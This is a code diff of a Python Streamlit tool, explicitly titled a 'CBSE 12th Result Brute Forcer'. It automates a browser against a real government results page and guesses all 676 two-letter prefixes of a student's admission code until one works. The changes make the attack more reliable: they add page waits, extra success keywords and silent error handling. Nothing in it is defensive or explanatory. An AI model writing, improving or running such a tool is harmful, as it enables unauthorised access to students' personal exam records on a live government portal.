@@ -9,7 +9,7 @@ import string
 
 # ========================= CONFIGURATION =========================
 URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"
-DELAY_BETWEEN_ATTEMPTS = 4.0
+DELAY = 4.0
 # ============================================================
 
 def get_driver():
@@ -22,7 +22,9 @@ def get_driver():
     return webdriver.Chrome(options=options)
 
 def is_success(driver):
+    """Your original logic"""
     try:
+        # Check error message
         try:
             error_elem = driver.find_element(By.ID, "err_msg")
             if error_elem.is_displayed() and error_elem.text.strip():
@@ -30,8 +32,9 @@ def is_success(driver):
         except NoSuchElementException:
             pass
         
+        # Success indicators
         try:
-            success_indicators = ["marks", "result", "subject", "grade", "total"]
+            success_indicators = ["marks", "result", "subject", "grade", "total", "percentage"]
             page_text = driver.page_source.lower()
             if any(ind in page_text for ind in success_indicators):
                 return True
@@ -51,7 +54,7 @@ st.title("🔍 CBSE 12th Result Brute Forcer")
 
 roll_number = st.text_input("Roll Number", value="18615900")
 known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
-delay = st.slider("Delay between attempts (seconds)", 3.0, 8.0, DELAY_BETWEEN_ATTEMPTS, 0.5)
+delay = st.slider("Delay between attempts (seconds)", 3.0, 8.0, DELAY, 0.5)
 
 if st.button("🚀 Start Brute Force", type="primary"):
     if len(known_last_6) != 6:
@@ -65,6 +68,11 @@ if st.button("🚀 Start Brute Force", type="primary"):
         try:
             driver = get_driver()
             driver.get(URL)
+            
+            # Wait for page to fully load
+            WebDriverWait(driver, 15).until(
+                EC.presence_of_element_located((By.TAG_NAME, "body"))
+            )
             status.success("✅ Page loaded. Starting brute force...")
 
             letters = string.ascii_uppercase
@@ -79,33 +87,35 @@ if st.button("🚀 Start Brute Force", type="primary"):
                     progress.info(f"Progress: {count}/676 | Trying: {attempt} → {code}")
 
                     try:
-                        # Fill fields
+                        # Wait for fields to appear
+                        WebDriverWait(driver, 10).until(
+                            EC.presence_of_element_located((By.ID, "rroll"))
+                        )
+
                         driver.find_element(By.ID, "rroll").clear()
                         driver.find_element(By.ID, "rroll").send_keys(roll_number)
 
                         driver.find_element(By.ID, "admn_id").clear()
                         driver.find_element(By.ID, "admn_id").send_keys(code)
 
-                        # === MORE RELIABLE SUBMIT CLICK ===
+                        # Reliable click
                         submit_btn = WebDriverWait(driver, 10).until(
                             EC.element_to_be_clickable((By.ID, "submit"))
                         )
                         submit_btn.click()
 
-                        # Force delay
                         time.sleep(delay)
 
                         if is_success(driver):
                             result_box.success(f"""
                             SUCCESS FOUND!
 
-                            Full Code: {code}
-                            Prefix: {attempt}
+                            Full Code: **{code}**
+                            Prefix: **{attempt}**
                             """)
                             st.balloons()
                             break
-                    except Exception as e:
-                        progress.warning(f"Click error on {attempt}, continuing...")
+                    except Exception:
                         continue
 
             else:
